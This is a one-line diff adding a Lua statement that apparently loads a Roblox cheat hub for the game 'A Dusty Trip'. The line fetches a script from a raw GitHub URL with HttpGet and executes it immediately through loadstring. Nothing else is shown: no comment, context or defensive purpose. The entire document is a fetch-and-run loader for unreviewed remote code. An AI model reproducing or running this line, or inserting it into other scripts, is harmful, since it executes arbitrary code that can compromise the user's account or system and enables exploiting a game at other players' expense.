@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/CurseOfDarkness/CurseHubADustyTrip/refs/heads/main/A%20Dusty%20Trip')))()
